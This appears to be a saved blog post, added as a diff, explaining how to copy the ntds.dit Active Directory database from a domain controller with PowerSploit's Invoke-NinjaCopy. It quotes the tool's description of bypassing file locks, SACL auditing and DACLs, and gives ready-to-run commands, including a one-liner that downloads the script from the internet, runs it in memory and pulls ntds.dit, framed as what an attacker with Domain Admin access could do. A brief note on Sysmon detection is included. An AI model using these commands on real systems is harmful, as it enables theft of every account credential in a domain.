@@ -1,0 +1,40 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Pulling ntds.dit Remotely Using PowerSploit Invoke-NinjaCopy</title>
+</head><body><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1">Invoke-NinaCopy</a>&nbsp;is a PowerShell function that can copy a file off of a remote computer (even if the file is locked, provides direct access to the file) leveraging PowerShell remoting (PowerShell remoting has to be enabled on the target DC).<br/>
+&nbsp;<br/>
+<a href="http://blogs.technet.com/b/sysinternals/archive/2016/01/05/update-sigcheck-v2-4-sysmon-v3-2-process-explorer-v16-1-autoruns-v13-51-accesschk-v6-01.aspx">Sysmon v3.2 now includes detection of raw disk access which may provide detection of Invoke-NinjaCopy use</a>.<br/>
+&nbsp;<br/>
+Sysmon v3.2 now detects raw data access like Invoke-NinjaCopy<br/>
+“This release of Sysmon, a background service that logs security-relevant process and network activity to the Windows event log, now has the option of logging raw disk and volume accesses, operations commonly performed by malicious toolkits to read information by bypassing higher-level security features.<br/>
+&nbsp;<br/>
+From the Invoke-NinjaCopy file synopsis:<br/>
+<span style="font-size: 9pt">This script can copy files off an NTFS volume by opening a read handle to the entire volume (such as c:) and parsing the NTFS structures. This requires you are an administrator of the server. This allows you to bypass the following protections:<br/>
+&nbsp; &nbsp; 1. Files which are opened by a process and cannot be opened by other processes, such as the NTDS.dit file or SYSTEM registry hives<br/>
+&nbsp; &nbsp; 2. SACL flag set on a file to alert when the file is opened (I'm not using a Win32 API to open the file, so Windows has no clue)<br/>
+&nbsp; &nbsp; 3. Bypass DACL's, such as a DACL which only allows SYSTEM to open a file<br/>
+<br/>
+If the LocalDestination param is specified, the file will be copied to the file path specified on the local server (the server the script is being run from).<br/>
+If the RemoteDestination param is specified, the file will be copied to the file path specified on the remote server.<br/>
+<br/>
+The script works by opening a read handle to the volume (which if logged, may stand out, but I don't think most people log this and other processes do it too).<br/>
+The script then uses NTFS parsing code written by cyb70289 and posted to CodePlex to parse the NTFS structures. Since the NTFS parsing code is written<br/>
+in C++, I have compiled the code to a DLL and load it reflective in to PowerShell using the Invoke-ReflectivePEInjection.ps1 script (see below for a link<br/>
+to the original script).<br/>
+<br/>
+</span><br/>
+I have created a PowerShell script called Invoke-NinjaCopy that allows any file (including NTDS.dit) to be copied without starting suspicious services, injecting in to processes, or elevating to SYSTEM.<br/>
+&nbsp;<br/>
+Command:<br/>
+<i>Invoke-NinjaCopy -Path “c:\windows\ntds\ntds.dit” -ComputerName “RDLABDC02” -LocalDestination “c:\temp\ntds.dit”</i><br/>
+&nbsp;<br/>
+This example executes Invoke-Ninjacopy from code downloaded from the Internet and executed entirely in memory. If the attacker compromised a workstation a Domain Admin logged onto, this scenario would work, enabling the attacker to copy the Active Directory database file from a Domain Controller to the workstation and then upload to the Internet.<br/>
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1') ; Invoke-NinjaCopy -Path "c:\windows\ntds\ntds.dit" -ComputerName "&lt;COMPUTER&gt;" -LocalDestination "c:\temp\ntds.dit"<br/>
+<br/>
+Using a <a href="https://github.com/yosqueoy/ditsnap">DIT Snapshot Viewer</a>, we can validate that we got the ntds.dit file successfully.<br/>
+I had to “take a snapshot” of the ntds.dit file to correct errors when grabbing the file from a running system.<br/>
+<br/>
+<br/>
+</body></html>
